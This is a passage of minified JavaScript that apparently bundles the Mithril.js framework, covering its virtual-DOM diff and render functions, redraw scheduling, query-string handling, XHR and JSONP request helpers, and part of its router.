            th: "tr",
            td: "tr",
            colgroup: "table",
            col: "colgroup",
        };

        function f(t, n, i, o) {
            var r = n.children.match(/^\s*?<(\w+)/im) || [],
                s = a.createElement(p[r[1]] || "div");
            "http://www.w3.org/2000/svg" === i
                ? ((s.innerHTML =
                    '<svg xmlns="http://www.w3.org/2000/svg">' + n.children + "</svg>"),
                   (s = s.firstChild))
            : (s.innerHTML = n.children),
                (n.dom = s.firstChild),
                (n.domSize = s.childNodes.length),
                (n.instance = []);
            for (var l, c = a.createDocumentFragment(); (l = s.firstChild); )
                n.instance.push(l), c.appendChild(l);
            b(t, c, o);
        }

        function $(t, n, i, o, a, r) {
            if (!(n === i || (null == n && null == i))) {
                if (null == n || 0 === n.length) h(t, i, 0, i.length, o, a, r);
                else if (null == i || 0 === i.length) x(t, n, 0, n.length);
                else {
                    var s = null != n[0] && null != n[0].key,
                        l = null != i[0] && null != i[0].key,
                        c = 0,
                        d = 0;
                    if (!s) for (; d < n.length && null == n[d]; ) d++;
                    if (!l) for (; c < i.length && null == i[c]; ) c++;
                    if (s !== l) x(t, n, d, n.length), h(t, i, c, i.length, o, a, r);
                    else if (l) {
                        for (
                            var p, f, $, b, w, I, P = n.length - 1, O = i.length - 1;
                            P >= d && O >= c && ((b = n[P]), (w = i[O]), b.key === w.key);

                        )
                            b !== w && g(t, b, w, o, a, r),
                                null != w.dom && (a = w.dom),
                                P--,
                                O--;
                        for (
                            ;
                            P >= d && O >= c && ((f = n[d]), ($ = i[c]), f.key === $.key);

                        )
                            d++, c++, f !== $ && g(t, f, $, o, k(n, d, a), r);
                        for (
                            ;
                            P >= d &&
                            O >= c &&
                            !(c === O || f.key !== w.key || b.key !== $.key);

                        )
                            v(t, b, (I = k(n, d, a))),
                                b !== $ && g(t, b, $, o, I, r),
                                ++c <= --O && v(t, f, a),
                                f !== w && g(t, f, w, o, a, r),
                                null != w.dom && (a = w.dom),
                                d++,
                                (b = n[--P]),
                                (w = i[O]),
                                (f = n[d]),
                                ($ = i[c]);
                        for (; P >= d && O >= c && b.key === w.key; )
                            b !== w && g(t, b, w, o, a, r),
                                null != w.dom && (a = w.dom),
                                P--,
                                O--,
                                (b = n[P]),
                                (w = i[O]);
                        if (c > O) x(t, n, d, P + 1);
                        else if (d > P) h(t, i, c, O + 1, o, a, r);
                        else {
                            var p,
                                A,
                                B = a,
                                D = O - c + 1,
                                z = Array(D),
                                W = 0,
                                L = 0,
                                H = 2147483647,
                                V = 0;
                            for (L = 0; L < D; L++) z[L] = -1;
                            for (L = O; L >= c; L--) {
                                null == p && (p = m(n, d, P + 1));
                                var F = p[(w = i[L]).key];
                                null != F &&
                                    ((H = F < H ? F : -1),
                                     (z[L - c] = F),
                                     (b = n[F]),
                                     (n[F] = null),
                                     b !== w && g(t, b, w, o, a, r),
                                     null != w.dom && (a = w.dom),
                                     V++);
                            }
                            if (((a = B), V !== P - d + 1 && x(t, n, d, P + 1), 0 === V))
                                h(t, i, c, O + 1, o, a, r);
                            else if (-1 === H)
                                for (
                                    W =
                                    (A = (function t(n) {
                                        for (
                                            var i = [0],
                                            o = 0,
                                            a = 0,
                                            r = 0,
                                            s = (_.length = n.length),
                                            r = 0;
                                            r < s;
                                            r++
                                        )
                                            _[r] = n[r];
                                        for (var r = 0; r < s; ++r)
                                            if (-1 !== n[r]) {
                                                var l = i[i.length - 1];
                                                if (n[l] < n[r]) {
                                                    (_[r] = l), i.push(r);
                                                    continue;
                                                }
                                                for (o = 0, a = i.length - 1; o < a; ) {
                                                    var c = (o >>> 1) + (a >>> 1) + (o & a & 1);
                                                    n[i[c]] < n[r] ? (o = c + 1) : (a = c);
                                                }
                                                n[r] < n[i[o]] &&
                                                    (o > 0 && (_[r] = i[o - 1]), (i[o] = r));
                                            }
                                        for (a = i[(o = i.length) - 1]; o-- > 0; )
                                            (i[o] = a), (a = _[a]);
                                        return (_.length = 0), i;
                                    })(z)).length - 1,
                                    L = O;
                                    L >= c;
                                    L--
                                )
                                    ($ = i[L]),
                                        -1 === z[L - c]
                                        ? u(t, $, o, r, a)
                                    : A[W] === L - c
                                        ? W--
                                    : v(t, $, a),
                                        null != $.dom && (a = i[L].dom);
                            else
                                for (L = O; L >= c; L--)
                                    ($ = i[L]),
                                        -1 === z[L - c] && u(t, $, o, r, a),
                                        null != $.dom && (a = i[L].dom);
                        }
                    } else {
                        var U = n.length < i.length ? n.length : i.length;
                        for (c = c < d ? c : d; c < U; c++)
                            (f = n[c]) === ($ = i[c]) ||
                                (null == f && null == $) ||
                                (null == f
                                 ? u(t, $, o, r, k(n, c + 1, a))
                                 : null == $
                                 ? S(t, f)
                                 : g(t, f, $, o, k(n, c + 1, a), r));
                        n.length > U && x(t, n, c, n.length),
                            i.length > U && h(t, i, c, i.length, o, a, r);
                    }
                }
            }
        }

        function g(n, i, o, a, r, l) {
            var d,
                h,
                p,
                m,
                _,
                k,
                v,
                b,
                x,
                P,
                O,
                D,
                z = i.tag;
            if (z === o.tag) {
                if (
                    ((o.state = i.state),
                     (o.events = i.events),
                     (function t(n, i) {
                        do {
                            if (
                                null != n.attrs &&
                                "function" == typeof n.attrs.onbeforeupdate
                            ) {
                                var o = c.call(n.attrs.onbeforeupdate, n, i);
                                if (void 0 !== o && !o) break;
                            }
                            if (
                                "string" != typeof n.tag &&
                                "function" == typeof n.state.onbeforeupdate
                            ) {
                                var o = c.call(n.state.onbeforeupdate, n, i);
                                if (void 0 !== o && !o) break;
                            }
                            return !1;
                        } while (!1);
                        return (
                            (n.dom = i.dom),
                            (n.domSize = i.domSize),
                            (n.instance = i.instance),
                            (n.attrs = i.attrs),
                            (n.children = i.children),
                            (n.text = i.text),
                            !0
                        );
                    })(o, i))
                )
                    return;
                if ("string" == typeof z)
                    switch ((null != o.attrs && q(o.attrs, o, a), z)) {
                        case "#":
                            (d = i),
                                (h = o),
                                d.children.toString() !== h.children.toString() &&
                                (d.dom.nodeValue = h.children),
                                (h.dom = d.dom);
                            break;
                        case "<":
                            (p = n),
                                (m = i),
                                (_ = o),
                                (k = l),
                                (v = r),
                                m.children !== _.children
                                ? (I(p, m), f(p, _, k, v))
                            : ((_.dom = m.dom),
                               (_.domSize = m.domSize),
                               (_.instance = m.instance));
                            break;
                        case "[":
                            !(function t(n, i, o, a, r, s) {
                                $(n, i.children, o.children, a, r, s);
                                var l = 0,
                                    c = o.children;
                                if (((o.dom = null), null != c)) {
                                    for (var d = 0; d < c.length; d++) {
                                        var h = c[d];
                                        null != h &&
                                            null != h.dom &&
                                            (null == o.dom && (o.dom = h.dom), (l += h.domSize || 1));
                                    }
                                    1 !== l && (o.domSize = l);
                                }
                            })(n, i, o, a, r, l);
                            break;
                        default:
                            (b = i),
                                (x = o),
                                (P = a),
                                (O = l),
                                (D = x.dom = b.dom),
                                (O = s(x) || O),
                                "textarea" === x.tag && null == x.attrs && (x.attrs = {}),
                                (function t(n, i, o, a) {
                                if (
                                    (i &&
                                     i === o &&
                                     console.warn(
                                        "Don't reuse attrs object, use new object for every redraw, this will throw in next major"
                                    ),
                                     null != o)
                                ) {
                                    "input" === n.tag &&
                                        null != o.type &&
                                        n.dom.setAttribute("type", o.type);
                                    var r,
                                        s = "input" === n.tag && "file" === o.type;
                                    for (var l in o) A(n, l, i && i[l], o[l], a, s);
                                }
                                if (null != i)
                                    for (var l in i)
                                        null != (r = i[l]) &&
                                            (null == o || null == o[l]) &&
                                            B(n, l, r, a);
                            })(x, b.attrs, x.attrs, O),
                                w(x) || $(D, b.children, x.children, P, null, O);
                    }
                else
                    !(function n(i, o, a, r, s, l) {
                        if (
                            ((a.instance = t.normalize(c.call(a.state.view, a))),
                             a.instance === a)
                        )
                            throw Error(
                                "A view cannot return the vnode it received as argument"
                            );
                        q(a.state, a, r),
                            null != a.attrs && q(a.attrs, a, r),
                            null != a.instance
                            ? (null == o.instance
                               ? u(i, a.instance, r, l, s)
                               : g(i, o.instance, a.instance, r, s, l),
                               (a.dom = a.instance.dom),
                               (a.domSize = a.instance.domSize))
                        : null != o.instance
                            ? (S(i, o.instance), (a.dom = void 0), (a.domSize = 0))
                        : ((a.dom = o.dom), (a.domSize = o.domSize));
                    })(n, i, o, a, r, l);
            } else S(n, i), u(n, o, a, l, r);
        }

        function m(t, n, i) {
            for (var o = Object.create(null); n < i; n++) {
                var a = t[n];
                if (null != a) {
                    var r = a.key;
                    null != r && (o[r] = n);
                }
            }
            return o;
        }
        var _ = [];

        function k(t, n, i) {
            for (; n < t.length; n++)
                if (null != t[n] && null != t[n].dom) return t[n].dom;
            return i;
        }

        function v(t, n, i) {
            var o = a.createDocumentFragment();
            (function t(n, i, o) {
                for (; null != o.dom && o.dom.parentNode === n; ) {
                    if ("string" != typeof o.tag) {
                        if (null != (o = o.instance)) continue;
                    } else if ("<" === o.tag)
                        for (var a = 0; a < o.instance.length; a++)
                            i.appendChild(o.instance[a]);
                    else if ("[" !== o.tag) i.appendChild(o.dom);
                    else if (1 === o.children.length) {
                        if (null != (o = o.children[0])) continue;
                    } else
                        for (var a = 0; a < o.children.length; a++) {
                            var r = o.children[a];
                            null != r && t(n, i, r);
                        }
                    break;
                }
            })(t, o, n),
                b(t, o, i);
        }

        function b(t, n, i) {
            null != i ? t.insertBefore(n, i) : t.appendChild(n);
        }

        function w(t) {
            if (
                null == t.attrs ||
                (null == t.attrs.contenteditable && null == t.attrs.contentEditable)
            )
                return !1;
            var n = t.children;
            if (null != n && 1 === n.length && "<" === n[0].tag) {
                var i = n[0].children;
                t.dom.innerHTML !== i && (t.dom.innerHTML = i);
            } else if (null != n && 0 !== n.length)
                throw Error("Child node of a contenteditable must be trusted.");
            return !0;
        }

        function x(t, n, i, o) {
            for (var a = i; a < o; a++) {
                var r = n[a];
                null != r && S(t, r);
            }
        }

        function S(t, n) {
            var i,
                o,
                a = 0,
                r = n.state;
            if (
                "string" != typeof n.tag &&
                "function" == typeof n.state.onbeforeremove
            ) {
                var s = c.call(n.state.onbeforeremove, n);
                null != s && "function" == typeof s.then && ((a = 1), (i = s));
            }
            if (n.attrs && "function" == typeof n.attrs.onbeforeremove) {
                var s = c.call(n.attrs.onbeforeremove, n);
                null != s && "function" == typeof s.then && ((a |= 2), (o = s));
            }
            if ((l(n, r), a)) {
                if (null != i) {
                    var d = function () {
                        1 & a && ((a &= 2) || h());
                    };
                    i.then(d, d);
                }
                if (null != o) {
                    var d = function () {
                        2 & a && ((a &= 1) || h());
                    };
                    o.then(d, d);
                }
            } else O(n), P(t, n);

            function h() {
                l(n, r), O(n), P(t, n);
            }
        }

        function I(t, n) {
            for (var i = 0; i < n.instance.length; i++) t.removeChild(n.instance[i]);
        }

        function P(t, n) {
            for (; null != n.dom && n.dom.parentNode === t; ) {
                if ("string" != typeof n.tag) {
                    if (null != (n = n.instance)) continue;
                } else if ("<" === n.tag) I(t, n);
                else {
                    if (
                        "[" !== n.tag &&
                        (t.removeChild(n.dom), !Array.isArray(n.children))
                    )
                        break;
                    if (1 === n.children.length) {
                        if (null != (n = n.children[0])) continue;
                    } else
                        for (var i = 0; i < n.children.length; i++) {
                            var o = n.children[i];
                            null != o && P(t, o);
                        }
                }
                break;
            }
        }

        function O(t) {
            if (
                ("string" != typeof t.tag &&
                 "function" == typeof t.state.onremove &&
                 c.call(t.state.onremove, t),
                 t.attrs &&
                 "function" == typeof t.attrs.onremove &&
                 c.call(t.attrs.onremove, t),
                 "string" != typeof t.tag)
            )
                null != t.instance && O(t.instance);
            else {
                var n = t.children;
                if (Array.isArray(n))
                    for (var i = 0; i < n.length; i++) {
                        var o = n[i];
                        null != o && O(o);
                    }
            }
        }

        function A(t, n, i, o, r, s) {
            var l, c;
            if (
                !(
                    "key" === n ||
                    "is" === n ||
                    null == o ||
                    D(n) ||
                    (i === o &&
                     ((l = t),
                      (c = n),
                      "value" !== c &&
                      "checked" !== c &&
                      "selectedIndex" !== c &&
                      ("selected" !== c || l.dom !== d()) &&
                      ("option" !== l.tag || l.dom.parentNode !== a.activeElement)) &&
                     "object" != typeof o) ||
                    ("type" === n && "input" === t.tag)
                )
            ) {
                if ("o" === n[0] && "n" === n[1]) return U(t, n, o);
                if ("xlink:" === n.slice(0, 6))
                    t.dom.setAttributeNS("http://www.w3.org/1999/xlink", n.slice(6), o);
                else if ("style" === n) V(t.dom, i, o);
                else if (z(t, n, r)) {
                    if ("value" === n) {
                        if (
                            (("input" === t.tag || "textarea" === t.tag) &&
                             t.dom.value === "" + o &&
                             (s || t.dom === d())) ||
                            ("select" === t.tag && null !== i && t.dom.value === "" + o) ||
                            ("option" === t.tag && null !== i && t.dom.value === "" + o)
                        )
                            return;
                        if (s && "" + o != "") {
                            console.error("`value` is read-only on file inputs!");
                            return;
                        }
                    }
                    t.dom[n] = o;
                } else
                    "boolean" == typeof o
                        ? o
                        ? t.dom.setAttribute(n, "")
                    : t.dom.removeAttribute(n)
                    : t.dom.setAttribute("className" === n ? "class" : n, o);
            }
        }

        function B(t, n, i, o) {
            if (!("key" === n || "is" === n || null == i || D(n))) {
                if ("o" === n[0] && "n" === n[1]) U(t, n, void 0);
                else if ("style" === n) V(t.dom, i, null);
                else if (
                    z(t, n, o) &&
                    "className" !== n &&
                    "title" !== n &&
                    ("value" !== n ||
                     ("option" !== t.tag &&
                      ("select" !== t.tag ||
                       -1 !== t.dom.selectedIndex ||
                       t.dom !== d()))) &&
                    ("input" !== t.tag || "type" !== n)
                )
                    t.dom[n] = null;
                else {
                    var a = n.indexOf(":");
                    -1 !== a && (n = n.slice(a + 1)),
                        !1 !== i && t.dom.removeAttribute("className" === n ? "class" : n);
                }
            }
        }

        function D(t) {
            return (
                "oninit" === t ||
                "oncreate" === t ||
                "onupdate" === t ||
                "onremove" === t ||
                "onbeforeremove" === t ||
                "onbeforeupdate" === t
            );
        }

        function z(t, n, i) {
            return (
                void 0 === i &&
                (t.tag.indexOf("-") > -1 ||
                 (null != t.attrs && t.attrs.is) ||
                 ("href" !== n &&
                  "list" !== n &&
                  "form" !== n &&
                  "width" !== n &&
                  "height" !== n)) &&
                n in t.dom
            );
        }
        var W = /[A-Z]/g;

        function L(t) {
            return "-" + t.toLowerCase();
        }

        function H(t) {
            return "-" === t[0] && "-" === t[1]
                ? t
            : "cssFloat" === t
                ? "float"
            : t.replace(W, L);
        }

        function V(t, n, i) {
            if (n !== i) {
                if (null == i) t.style.cssText = "";
                else if ("object" != typeof i) t.style.cssText = i;
                else if (null == n || "object" != typeof n)
                    for (var o in ((t.style.cssText = ""), i)) {
                        var a = i[o];
                        null != a && t.style.setProperty(H(o), String(a));
                    }
                else {
                    for (var o in i) {
                        var a = i[o];
                        null != a &&
                            (a = String(a)) !== String(n[o]) &&
                            t.style.setProperty(H(o), a);
                    }
                    for (var o in n)
                        null != n[o] && null == i[o] && t.style.removeProperty(H(o));
                }
            }
        }

        function F() {
            this._ = o;
        }

        function U(t, n, i) {
            null != t.events
                ? ((t.events._ = o),
                   t.events[n] !== i &&
                   (null != i && ("function" == typeof i || "object" == typeof i)
                    ? (null == t.events[n] &&
                       t.dom.addEventListener(n.slice(2), t.events, !1),
                       (t.events[n] = i))
                    : (null != t.events[n] &&
                       t.dom.removeEventListener(n.slice(2), t.events, !1),
                       (t.events[n] = void 0))))
            : null != i &&
                ("function" == typeof i || "object" == typeof i) &&
                ((t.events = new F()),
                 t.dom.addEventListener(n.slice(2), t.events, !1),
                 (t.events[n] = i));
        }

        function N(t, n, i) {
            "function" == typeof t.oninit && c.call(t.oninit, n),
                "function" == typeof t.oncreate && i.push(c.bind(t.oncreate, n));
        }

        function q(t, n, i) {
            "function" == typeof t.onupdate && i.push(c.bind(t.onupdate, n));
        }
        return (
            (F.prototype = Object.create(null)),
            (F.prototype.handleEvent = function (t) {
                var n,
                    i = this["on" + t.type];
                "function" == typeof i
                    ? (n = i.call(t.currentTarget, t))
                : "function" == typeof i.handleEvent && i.handleEvent(t),
                    this._ && !1 !== t.redraw && (0, this._)(),
                    !1 === n && (t.preventDefault(), t.stopPropagation());
            }),
            function (n, a, r) {
                if (!n)
                    throw TypeError("DOM element being rendered to does not exist.");
                if (null != i && n.contains(i))
                    throw TypeError(
                        "Node is currently being rendered to and thus is locked."
                    );
                var s = o,
                    l = i,
                    c = [],
                    h = d(),
                    u = n.namespaceURI;
                (i = n), (o = "function" == typeof r ? r : void 0);
                try {
                    null == n.vnodes && (n.textContent = ""),
                        (a = t.normalizeChildren(Array.isArray(a) ? a : [a])),
                        $(
                        n,
                        n.vnodes,
                        a,
                        c,
                        null,
                        "http://www.w3.org/1999/xhtml" === u ? void 0 : u
                    ),
                        (n.vnodes = a),
                        null != h && d() !== h && "function" == typeof h.focus && h.focus();
                    for (var p = 0; p < c.length; p++) c[p]();
                } finally {
                    (o = s), (i = l);
                }
            }
        );
    });
}

function eo() {
    return Ls || ((Ls = 1), (sn = th()("u" > typeof window ? window : null))), sn;
}
"u" > typeof window
    ? (typeof window.Promise > "u"
       ? (window.Promise = _t)
       : window.Promise.prototype.finally ||
       (window.Promise.prototype.finally = _t.prototype.finally),
       (en.exports = window.Promise))
: "u" > typeof rt
    ? (typeof rt.Promise > "u"
       ? (rt.Promise = _t)
       : rt.Promise.prototype.finally ||
       (rt.Promise.prototype.finally = _t.prototype.finally),
       (en.exports = rt.Promise))
: (en.exports = _t);
var nn,
    Us,
    sn,
    Ls,
    rn,
    qs,
    Ns = Ge(),
    ih = function (t, n, i) {
        var o = [],
            a = !1,
            r = -1;

        function s() {
            for (r = 0; r < o.length; r += 2)
                try {
                    t(o[r], Ns(o[r + 1]), l);
                } catch (n) {
                    i.error(n);
                }
            r = -1;
        }

        function l() {
            a ||
                ((a = !0),
                 n(function () {
                (a = !1), s();
            }));
        }
        return (
            (l.sync = s),
            {
                mount: function n(i, a) {
                    if (null != a && null == a.view && "function" != typeof a)
                        throw TypeError("m.mount expects a component, not a vnode.");
                    var s = o.indexOf(i);
                    s >= 0 && (o.splice(s, 2), s <= r && (r -= 2), t(i, [])),
                        null != a && (o.push(i, a), t(i, Ns(a), l));
                },
                redraw: l,
            }
        );
    },
    nh = eo(),
    ss = ih(
        nh,
        "u" > typeof requestAnimationFrame ? requestAnimationFrame : null,
        "u" > typeof console ? console : null
    );

function to() {
    return (
        qs ||
        ((qs = 1),
         (rn = function (t) {
            if ("[object Object]" !== Object.prototype.toString.call(t)) return "";
            var n = [];
            for (var i in t) o(i, t[i]);
            return n.join("&");

            function o(t, i) {
                if (Array.isArray(i))
                    for (var a = 0; a < i.length; a++) o(t + "[" + a + "]", i[a]);
                else if ("[object Object]" === Object.prototype.toString.call(i))
                    for (var a in i) o(t + "[" + a + "]", i[a]);
                else
                    n.push(
                        encodeURIComponent(t) +
                        (null != i && "" !== i ? "=" + encodeURIComponent(i) : "")
                    );
            }
        })),
        rn
    );
}

function io() {
    if (Ws) return on;
    Ws = 1;
    var t = Ci;
    return (on =
            Object.assign ||
            function (n, i) {
        for (var o in i) t.call(i, o) && (n[o] = i[o]);
    });
}

function rs() {
    if (Xs) return an;
    Xs = 1;
    var t = to(),
        n = io();
    return (an = function (i, o) {
        if (/:([^\/\.-]+)(\.{3})?:/.test(i))
            throw SyntaxError(
                "Template parameter names must be separated by either a '/', '-', or '.'."
            );
        if (null == o) return i;
        var a = i.indexOf("?"),
            r = i.indexOf("#"),
            s = r < 0 ? i.length : r,
            l = i.slice(0, a < 0 ? s : a),
            c = {};
        n(c, o);
        var d = l.replace(/:([^\/\.-]+)(\.{3})?/g, function (t, n, i) {
            return (
                delete c[n],
                null == o[n] ? t : i ? o[n] : encodeURIComponent(String(o[n]))
            );
        }),
            h = d.indexOf("?"),
            u = d.indexOf("#"),
            p = u < 0 ? d.length : u,
            f = h < 0 ? p : h,
            $ = d.slice(0, f);
        a >= 0 && ($ += i.slice(a, s)),
            h >= 0 && ($ += (a < 0 ? "?" : "&") + d.slice(h, p));
        var g = t(c);
        return (
            g && ($ += (a < 0 && h < 0 ? "?" : "&") + g),
            r >= 0 && ($ += i.slice(r)),
            u >= 0 && ($ += (r < 0 ? "" : "&") + d.slice(u)),
            $
        );
    });
}
var on,
    Ws,
    an,
    Xs,
    ln,
    Ys,
    sh = rs(),
    Gs = Ci,
    rh = function (t, n, i) {
        var o = 0;

        function a(t) {
            return new n(t);
        }

        function r(t) {
            return function (o, r) {
                "string" != typeof o ? ((r = o), (o = o.url)) : null == r && (r = {});
                var s = new n(function (n, i) {
                    t(
                        sh(o, r.params),
                        r,
                        function (t) {
                            if ("function" == typeof r.type) {
                                if (Array.isArray(t))
                                    for (var i = 0; i < t.length; i++) t[i] = new r.type(t[i]);
                                else t = new r.type(t);
                            }
                            n(t);
                        },
                        i
                    );
                });
                if (!0 === r.background) return s;
                var l = 0;

                function c() {
                    0 == --l && "function" == typeof i && i();
                }
                return (function t(n) {
                    var i = n.then;
                    return (
                        (n.constructor = a),
                        (n.then = function () {
                            l++;
                            var o = i.apply(n, arguments);
                            return (
                                o.then(c, function (t) {
                                    if ((c(), 0 === l)) throw t;
                                }),
                                t(o)
                            );
                        }),
                        n
                    );
                })(s);
            };
        }

        function s(t, n) {
            for (var i in t.headers)
                if (Gs.call(t.headers, i) && i.toLowerCase() === n) return !0;
            return !1;
        }
        return (
            (a.prototype = n.prototype),
            (a.__proto__ = n),
            {
                request: r(function (n, i, o, a) {
                    var r,
                        l = null != i.method ? i.method.toUpperCase() : "GET",
                        c = i.body,
                        d =
                        (null == i.serialize || i.serialize === JSON.serialize) &&
                        !(c instanceof t.FormData || c instanceof t.URLSearchParams),
                        h =
                        i.responseType || ("function" == typeof i.extract ? "" : "json"),
                        u = new t.XMLHttpRequest(),
                        p = !1,
                        f = !1,
                        $ = u,
                        g = u.abort;
                    for (var m in ((u.abort = function () {
                        (p = !0), g.call(this);
                    }),
                                   u.open(
                        l,
                        n,
                        !1 !== i.async,
                        "string" == typeof i.user ? i.user : void 0,
                        "string" == typeof i.password ? i.password : void 0
                    ),
                                   d &&
                                   null != c &&
                                   !s(i, "content-type") &&
                                   u.setRequestHeader(
                        "Content-Type",
                        "application/json; charset=utf-8"
                    ),
                                   "function" == typeof i.deserialize ||
                                   s(i, "accept") ||
                                   u.setRequestHeader("Accept", "application/json, text/*"),
                                   i.withCredentials && (u.withCredentials = i.withCredentials),
                                   i.timeout && (u.timeout = i.timeout),
                                   (u.responseType = h),
                                   i.headers))
                        Gs.call(i.headers, m) && u.setRequestHeader(m, i.headers[m]);
                    (u.onreadystatechange = function (t) {
                        if (!p && 4 === t.target.readyState)
                            try {
                                var r,
                                    s =
                                    (t.target.status >= 200 && t.target.status < 300) ||
                                    304 === t.target.status ||
                                    /^file:\/\//i.test(n),
                                    l = t.target.response;
                                if ("json" === h) {
                                    if (!t.target.responseType && "function" != typeof i.extract)
                                        try {
                                            l = JSON.parse(t.target.responseText);
                                        } catch {
                                            l = null;
                                        }
                                } else
                                    (h && "text" !== h) ||
                                        null != l ||
                                        (l = t.target.responseText);
                                if (
                                    ("function" == typeof i.extract
                                     ? ((l = i.extract(t.target, i)), (s = !0))
                                     : "function" == typeof i.deserialize &&
                                     (l = i.deserialize(l)),
                                     s)
                                )
                                    o(l);
                                else {
                                    var c = function () {
                                        try {
                                            r = t.target.responseText;
                                        } catch {
                                            r = l;
                                        }
                                        var n = Error(r);
                                        (n.code = t.target.status), (n.response = l), a(n);
                                    };
                                    0 === u.status
                                        ? setTimeout(function () {
                                        f || c();
                                    })
                                    : c();
                                }
                            } catch (d) {
                                a(d);
                            }
                    }),
                        (u.ontimeout = function (t) {
                        f = !0;
                        var n = Error("Request timed out");
                        (n.code = t.target.status), a(n);
                    }),
                        "function" == typeof i.config &&
                        (u = i.config(u, i, n) || u) !== $ &&
                        ((r = u.abort),
                         (u.abort = function () {
                        (p = !0), r.call(this);
                    })),
                        null == c
                        ? u.send()
                    : "function" == typeof i.serialize
                        ? u.send(i.serialize(c))
                    : c instanceof t.FormData || c instanceof t.URLSearchParams
                        ? u.send(c)
                    : u.send(JSON.stringify(c));
                }),
                jsonp: r(function (n, i, a, r) {
                    var s =
                        i.callbackName ||
                        "_mithril_" + Math.round(1e16 * Math.random()) + "_" + o++,
                        l = t.document.createElement("script");
                    (t[s] = function (n) {
                        delete t[s], l.parentNode.removeChild(l), a(n);
                    }),
                        (l.onerror = function () {
                        delete t[s],
                            l.parentNode.removeChild(l),
                            r(Error("JSONP request failed"));
                    }),
                        (l.src =
                         n +
                         (0 > n.indexOf("?") ? "?" : "&") +
                         encodeURIComponent(i.callbackKey || "callback") +
                         "=" +
                         encodeURIComponent(s)),
                        t.document.documentElement.appendChild(l);
                }),
            }
        );
    },
    oh = yi,
    ah = ss,
    lh = rh("u" > typeof window ? window : null, oh, ah.redraw);

function no() {
    if (Ys) return ln;

    function t(t) {
        try {
            return decodeURIComponent(t);
        } catch {
            return t;
        }
    }
    return (
        (Ys = 1),
        (ln = function (n) {
            if ("" === n || null == n) return {};
            "?" === n.charAt(0) && (n = n.slice(1));
            for (var i = n.split("&"), o = {}, a = {}, r = 0; r < i.length; r++) {
                var s = i[r].split("="),
                    l = t(s[0]),
                    c = 2 === s.length ? t(s[1]) : "";
                "true" === c ? (c = !0) : "false" === c && (c = !1);
                var d = l.split(/\]\[?|\[/),
                    h = a;
                l.indexOf("[") > -1 && d.pop();
                for (var u = 0; u < d.length; u++) {
                    var p = d[u],
                        f = d[u + 1],
                        $ = "" == f || !isNaN(parseInt(f, 10));
                    if ("" === p) {
                        var l = d.slice(0, u).join();
                        null == o[l] && (o[l] = Array.isArray(h) ? h.length : 0),
                            (p = o[l]++);
                    } else if ("__proto__" === p) break;
                    if (u === d.length - 1) h[p] = c;
                    else {
                        var g = Object.getOwnPropertyDescriptor(h, p);
                        null != g && (g = g.value),
                            null == g && (h[p] = g = $ ? [] : {}),
                            (h = g);
                    }
                }
            }
            return a;
        })
    );
}

function os() {
    if ($s) return cn;
    $s = 1;
    var t = no();
    return (cn = function (n) {
        var i = n.indexOf("?"),
            o = n.indexOf("#"),
            a = o < 0 ? n.length : o,
            r = i < 0 ? a : i,
            s = n.slice(0, r).replace(/\/{2,}/g, "/");
        return (
            s
            ? ("/" !== s[0] && (s = "/" + s),
               s.length > 1 && "/" === s[s.length - 1] && (s = s.slice(0, -1)))
            : (s = "/"),
            {
                path: s,
                params: i < 0 ? {} : t(n.slice(i + 1, a)),
            }
        );
    });
}

function ch() {
    if (Ks) return hn;
    Ks = 1;
    var t = os();
    return (hn = function (n) {
        var i = t(n),
            o = Object.keys(i.params),
            a = [],
            r = RegExp(
                "^" +
                i.path.replace(
                    /:([^\/.-]+)(\.{3}|\.(?!\.)|-)?|[\\^$*+.()|\[\]{}]/g,
                    function (t, n, i) {
                        return null == n
                            ? "\\" + t
                        : (a.push({
                            k: n,
                            r: "..." === i,
                        }),
                           "..." === i
                           ? "(.*)"
                           : "." === i
                           ? "([^/]+)\\."
                           : "([^/]+)" + (i || ""));
                    }
                ) +
                "$"
            );
        return function (t) {
            for (var n = 0; n < o.length; n++)
                if (i.params[o[n]] !== t.params[o[n]]) return !1;
            if (!a.length) return r.test(t.path);
            var s = r.exec(t.path);
            if (null == s) return !1;
            for (var n = 0; n < a.length; n++)
                t.params[a[n].k] = a[n].r ? s[n + 1] : decodeURIComponent(s[n + 1]);
            return !0;
        };
    });
}

function so() {
    if (Js) return fn;
    Js = 1;
    var t = Ci,
        n = RegExp(
            "^(?:key|oninit|oncreate|onbeforeupdate|onupdate|onbeforeremove|onremove)$"
        );
    return (fn = function (i, o) {
        var a = {};
        if (null != o)
            for (var r in i)
                t.call(i, r) && !n.test(r) && 0 > o.indexOf(r) && (a[r] = i[r]);
        else for (var r in i) t.call(i, r) && !n.test(r) && (a[r] = i[r]);
        return a;
    });
}

function hh() {
    if (Qs) return un;
    Qs = 1;
    var t = Ge(),
        n = Zr,
        i = yi,
        o = rs(),
        a = os(),
        r = ch(),
        s = io(),
        l = so(),
        c = {};

    function d(t) {
        try {
            return decodeURIComponent(t);
        } catch {
            return t;
        }
    }
    return (un = function (h, u) {
        var p,
            f,
            $,
            g,
            m,
            _,
            k =
            null == h
        ? null
        : "function" == typeof h.setImmediate
        ? h.setImmediate
        : h.setTimeout,
            v = i.resolve(),
            b = !1,
            w = !1,
            x = 0,
            S = c,
            I = {
                onbeforeupdate: function () {
                    return !(!(x = x ? 2 : 1) || c === S);
                },
                onremove: function () {
                    h.removeEventListener("popstate", A, !1),
                        h.removeEventListener("hashchange", O, !1);
                },
                view: function () {
                    if (!(!x || c === S)) {
                        var n = [t($, g.key, g)];
                        return S && (n = S.render(n[0])), n;
                    }
                },
            },
            P = (D.SKIP = {});

        function O() {
            b = !1;
            var t = h.location.hash;
            "#" !== D.prefix[0] &&
                ((t = h.location.search + t),
                 "?" !== D.prefix[0] &&
                 "/" !== (t = h.location.pathname + t)[0] &&
                 (t = "/" + t));
            var n = t
            .concat()
            .replace(/(?:%[a-f89][a-f0-9])+/gim, d)
            .slice(D.prefix.length),
                i = a(n);

            function o(t) {
                console.error(t),
                    B(f, null, {
                    replace: !0,
                });
            }

            function r(t) {
                for (; t < p.length; t++)
                    if (p[t].check(i)) {
                        var a = p[t].component,
                            s = p[t].route,
                            l = a,
                            c = (_ = function (o) {
                                if (c === _) {
                                    if (o === P) return r(t + 1);
                                    ($ =
                                     null != o &&
                                     ("function" == typeof o.view || "function" == typeof o)
                                     ? o
                                     : "div"),
                                        (g = i.params),
                                        (m = n),
                                        (_ = null),
                                        (S = a.render ? a : null),
                                        2 === x ? u.redraw() : ((x = 2), u.redraw.sync());
                                }
                            });
                        a.view || "function" == typeof a
                            ? ((a = {}), c(l))
                        : a.onmatch
                            ? v
                            .then(function () {
                            return a.onmatch(i.params, n, s);
                        })
